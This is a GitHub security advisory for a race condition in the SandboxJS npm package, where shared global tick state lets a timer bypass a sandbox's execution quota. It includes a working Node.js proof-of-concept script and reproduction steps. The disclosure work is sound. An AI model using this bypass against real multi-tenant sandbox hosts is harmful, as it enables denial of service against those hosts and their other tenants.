# [M] SandboxJS has an execution-quota bypass (cross-sandbox currentTicks race) in SandboxJS timers

## Summary
Severity: Medium
Advisory: GHSA-7p5m-xrh7-769r
CVE: CVE-2026-32723
CWE: CWE-362
Ecosystem: npm
CVSS: CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-03-16
Source: https://github.com/advisories/GHSA-7p5m-xrh7-769r
Type: github-advisory

## Affected
- npm: `@nyariv/sandboxjs` — affected >=0 <0.8.35

## Details
## Summary

Assumed repo path is `/Users/zwique/Downloads/SandboxJS-0.8.34` (no `/Users/zwique/Downloads/SandboxJS` found). A global tick state (`currentTicks.current`) is shared between sandboxes. Timer string handlers are compiled at execution time using that global tick state rather than the scheduling sandbox's tick object. In multi-tenant / concurrent sandbox scenarios, another sandbox can overwrite `currentTicks.current` between scheduling and execution, causing the timer callback to run under a different sandbox's tick budget and bypass the original sandbox's execution quota/watchdog.

**Impact:** execution quota bypass → CPU/resource abuse  

---

## Details

- **Affected project:** SandboxJS (owner: nyariv)
- **Assumed checked-out version:** `SandboxJS-0.8.34` at `/Users/zwique/Downloads/SandboxJS-0.8.34`

### Vulnerable code paths

- **`/src/eval.ts`** — `sandboxFunction` binds `ticks` using `ticks || currentTicks.current`:
  ```
  createFunction(..., ticks || currentTicks.current, { ...context, ... })
  ```
  Relevant lines: 44, 53, 164, 167.

- **`/src/evaluator.ts` / `/src/executor.ts`** — global ticks:
  ```
  export const currentTicks = { current: { ticks: BigInt(0) } as Ticks };
  ```
  and
  ```
  _execNoneRecurse(...) { currentTicks.current = ticks; ... }
  ```
  Relevant lines: ~1700, 1712.

- **`sandboxedSetTimeout`** compiles string handlers at execution time, not at scheduling time, which lets `currentTicks.current` be the wrong sandbox's ticks when compilation occurs.

---

## Why This Is Vulnerable

- `currentTicks.current` is global mutable state shared across all sandbox instances.
- Timer string handlers are compiled at the moment the timer fires and read `currentTicks.current` at that time. If another sandbox runs between scheduling and execution, it can replace `currentTicks.current`. The scheduled timer's code will be compiled/executed with the other sandbox's tick budget. This allows the original sandbox's execution quota to be bypassed.

---

## Proof of Concept

> Run with Node.js; adjust path if needed.

```js
// PoC (run with node); adjust path if needed
import Sandbox from '/Users/zwique/Downloads/SandboxJS-0.8.34/node_modules/@nyariv/sandboxjs/build/Sandbox.js';

const globals = { ...Sandbox.SAFE_GLOBALS, setTimeout, clearTimeout };
const prototypeWhitelist = Sandbox.SAFE_PROTOTYPES;

const sandboxA = new Sandbox({
  globals,
  prototypeWhitelist,
  executionQuota: 50n,
  haltOnSandboxError: true,
});
let haltedA = false;
sandboxA.subscribeHalt(() => { haltedA = true; });

const sandboxB = new Sandbox({ globals, prototypeWhitelist });

// Sandbox A schedules a heavy string handler
sandboxA.compile(
  'setTimeout("let x=0; for (let i=0;i<200;i++){ x += i } globalThis.doneA = true;", 0);'
)().run();

// Run sandbox B before A's timer fires
sandboxB.compile('1+1')().run();

setTimeout(() => {
  console.log({ haltedA, doneA: sandboxA.context.sandboxGlobal.doneA });
}, 50);
```

### Reproduction Steps

1. Place the PoC in `hi.js` and run:
   ```
   node /Users/zwique/Downloads/SandboxJS-0.8.34/hi.js
   ```

2. Observe output similar to:
   ```
   { haltedA: false, doneA: true }
   ```
   This indicates the heavy loop completed and the quota was bypassed.

3. Remove the `sandboxB.compile('1+1')().run();` line and rerun. Output should now be:
   ```
   { haltedA: true }
   ```
   This indicates quota enforcement is working correctly.

---

## Impact

- **Type:** Runtime guard bypass (execution-quota / watchdog bypass)
- **Who is impacted:** Applications that run multiple SandboxJS instances concurrently in the same process — multi-tenant interpreters, plugin engines, server-side scripting hosts, online code runners.
- **Practical impact:** Attackers controlling sandboxed code can bypass configured execution quotas/watchdog and perform CPU-intensive loops or long-running computation, enabling resource exhaustion/DoS or denial of service against the host process or other tenants.
- **Does not (as tested) lead to:** Host object exposure or direct sandbox escape (no `process` / `require` leakage observed from this primitive alone). Escalation to RCE was attempted and not observed.

## References
- https://github.com/nyariv/SandboxJS/security/advisories/GHSA-7p5m-xrh7-769r
- https://nvd.nist.gov/vuln/detail/CVE-2026-32723
- https://github.com/nyariv/SandboxJS/commit/cc8f20b4928afed5478d5ad3d1737ef2dcfaac29
- https://github.com/nyariv/SandboxJS
